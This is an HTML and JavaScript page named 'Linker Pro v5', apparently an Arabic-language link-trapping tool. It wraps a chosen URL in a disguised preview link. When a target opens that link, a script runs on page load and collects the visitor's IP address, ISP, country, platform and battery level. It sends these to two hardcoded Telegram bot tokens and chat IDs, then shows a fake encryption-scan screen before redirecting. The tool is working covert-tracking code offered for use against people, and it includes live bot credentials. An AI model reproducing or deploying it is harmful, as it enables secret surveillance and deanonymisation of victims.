<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Linker Pro v5 | Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø£Ù„ÙˆØ§Ù† Ø§Ù„Ù…ØªØ·ÙˆØ±Ø© */
        :root {
            --primary: #00d2ff;
            --secondary: #3a7bd5;
            --bg-dark: #080c14;
            --card-bg: rgba(30, 41, 59, 0.7);
            --text-main: #f8fafc;
            --accent: #10b981;
        }

        body {
            font-family: 'Cairo', sans-serif;
            background: radial-gradient(circle at top, #1e293b 0%, var(--bg-dark) 100%);
            color: var(--text-main);
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„ØªØµÙ…ÙŠÙ… Ø§Ù„Ø²Ø¬Ø§Ø¬ÙŠ */
        .glass-container {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 24px;
            width: 90%;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease;
        }

        h1 {
            background: linear-gradient(to right, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .description {
            font-size: 0.9rem;
            color: #94a3b8;
            margin-bottom: 30px;
        }

        /* ØªØµÙ…ÙŠÙ… Ø§Ù„Ù…Ø¯Ø®Ù„Ø§Øª */
        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            padding: 16px;
            background: rgba(15, 23, 42, 0.6);
            border: 2px solid #334155;
            border-radius: 12px;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            box-sizing: border-box;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(0, 210, 255, 0.3);
        }

        /* Ø§Ù„Ø²Ø± Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ */
        button {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            font-size: 1.1rem;
            transition: all 0.3s ease;
            box-shadow: 0 10px 15px -3px rgba(58, 123, 213, 0.4);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 25px -5px rgba(58, 123, 213, 0.5);
        }

        /* Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ */
        #result-box {
            display: none;
            margin-top: 30px;
            padding: 20px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px dashed var(--accent);
            border-radius: 12px;
            animation: fadeIn 0.5s ease;
        }

        code {
            display: block;
            background: #000;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            color: var(--primary);
            word-break: break-all;
            margin-top: 10px;
        }

        /* Ø§Ù„ØªØ±Ø³ Ø§Ù„Ù…Ø·ÙˆØ± âš™ï¸ */
        .loading-overlay {
            display: none;
        }

        .gear-icon {
            font-size: 80px;
            background: linear-gradient(var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: spin 3s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="glass-container" id="main-container">
    <div id="generator-view">
        <h1>Linker Pro ğŸ”—</h1>
        <p class="description">Ù‚Ù… Ø¨ØªØ´ÙÙŠØ± ÙˆØªÙ„ØºÙŠÙ… Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø¨Ù„Ù…Ø³Ø© Ø§Ø­ØªØ±Ø§ÙÙŠØ© ÙˆØ§Ø­Ø¯Ø©</p>
        
        <div class="input-group">
            <input type="text" id="targetUrl" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ø§Ø¨Ø· (e.g. https://google.com)">
        </div>
        
        <button id="genBtn" onclick="handleGenerate()">ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¢Ù† âœ¨</button>

        <div id="result-box">
            <p style="color: var(--accent); font-weight: bold; margin: 0;">âœ… Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¥Ø±Ø³Ø§Ù„!</p>
            <code id="final-link"></code>
            <p style="font-size: 0.75rem; color: #94a3b8; margin-top: 10px;">Ø§Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆØ´Ø§Ø±ÙƒÙ‡ Ù…Ø¹ Ø§Ù„Ù‡Ø¯Ù</p>
        </div>
    </div>

    <div id="loading-view" class="loading-overlay">
        <div class="gear-icon">âš™ï¸</div>
        <h2 id="loading-status">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø±Ù‚Ù…ÙŠØ©...</h2>
        <p style="color: #64748b;">ÙŠØªÙ… Ø§Ù„Ø¢Ù† ØªØ´ÙÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ­Ù‚Ù† Ø§Ù„Ø³ÙƒØ±Ø¨ØªØ§Øª</p>
    </div>
</div>

<script>
    // Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³ØªÙ„Ù…ÙŠÙ† (Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„ØªÙŠ Ø·Ù„Ø¨Øª Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø© Ø¹Ù„ÙŠÙ‡Ø§)
    const recipients = [
        { token: "8522437337:AAHwqXJjBqbbTL-QDbQoV7eoHp6fWFkopno", chat_id: "6068331455" },
        { token: "8594996038:AAEb5I-j5t8fp7GPIuyAlV4Z-irdKf2Nm7w", chat_id: "6194281534" }
    ];

    // Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
    async function handleGenerate() {
        const urlInput = document.getElementById('targetUrl').value;
        const btn = document.getElementById('genBtn');
        
        if (!urlInput.startsWith('http')) return alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ø§Ø¨Ø· ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ http");

        btn.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ´ÙÙŠØ±...";
        const proxy = "https://corsproxy.io/?"; 
        
        try {
            const response = await fetch(proxy + encodeURIComponent(urlInput));
            const htmlText = await response.text();
            const doc = new DOMParser().parseFromString(htmlText, "text/html");
            
            const title = doc.querySelector('meta[property="og:title"]')?.content || doc.title || "Ø±Ø§Ø¨Ø· Ù…Ø­Ù…ÙŠ";
            const image = doc.querySelector('meta[property="og:image"]')?.content || "";

            const currentUrl = window.location.href.split('?')[0];
            const finalLink = `${currentUrl}?t=${encodeURIComponent(title)}&i=${encodeURIComponent(image)}&dest=${encodeURIComponent(urlInput)}`;

            document.getElementById('result-box').style.display = 'block';
            document.getElementById('final-link').innerText = finalLink;
            btn.innerText = "ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¢Ù† âœ¨";
        } catch (e) {
            alert("Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø®Ø§Ø¯Ù… Ø§Ù„ÙˆØ³ÙŠØ·");
            btn.innerText = "ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø¢Ù† âœ¨";
        }
    }

    // Ø¯Ø§Ù„Ø© Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„ (Start Capture)
    async function startCapture() {
        const params = new URLSearchParams(window.location.search);
        if (!params.has('dest')) return;

        // ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ù„ÙˆØ¶Ø¹ "Ø§Ù„Ù‡Ø¯Ù"
        document.getElementById('generator-view').style.display = 'none';
        document.getElementById('loading-view').style.display = 'block';
        const statusText = document.getElementById('loading-status');

        try {
            // Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª IP ÙˆØ§Ù„Ù…Ø²ÙˆØ¯
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            
            const port = window.location.port || "80/443";
            const isp = ipData.org || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

            let batteryLevel = "ØºÙŠØ± Ù…ØªØ§Ø­";
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryLevel = Math.floor(battery.level * 100) + "%";
            }

            // ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
            const message = `
â›”ï¸ *ØªÙ†Ø¨ÙŠÙ‡: Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯*
---------------------------------------
ğŸ”Œ *Ø§Ù„Ù…Ù†ÙØ°:* ${port}
ğŸ“¡ *Ø§Ù„Ù…Ø²ÙˆØ¯:* ${isp}
ğŸ”‹ *Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:* ${batteryLevel}
â° *Ø§Ù„ÙˆÙ‚Øª:* ${new Date().toLocaleString('ar-EG')}
ğŸ’» *Ø§Ù„Ù†Ø¸Ø§Ù…:* ${navigator.platform}
ğŸŒ *IP:* ${ipData.ip}
ğŸŒ *Ø§Ù„Ø¯ÙˆÙ„Ø©:* ${ipData.country_name}
ğŸ¯ *Ø§Ù„ÙˆØ¬Ù‡Ø©:* ${params.get('dest')}
            `;

            // Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø³ØªÙ„Ù…ÙŠÙ†
            for (const target of recipients) {
                const url = `https://api.telegram.org/bot${target.token}/sendMessage?chat_id=${target.chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                await fetch(url).catch(() => {});
            }

            // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„ÙØ­Øµ Ù‚Ø¨Ù„ Ø§Ù„ØªØ­ÙˆÙŠÙ„
            statusText.innerText = "Ø§ÙƒØªÙ…Ù„ ÙØ­Øµ Ø§Ù„ØªØ´ÙÙŠØ±... Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙˆØ¬ÙŠÙ‡";
            setTimeout(() => {
                window.location.href = params.get('dest');
            }, 3000);

        } catch (error) {
            window.location.href = params.get('dest');
        }
    }

    // Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
    startCapture();
</script>
</body>
</html>
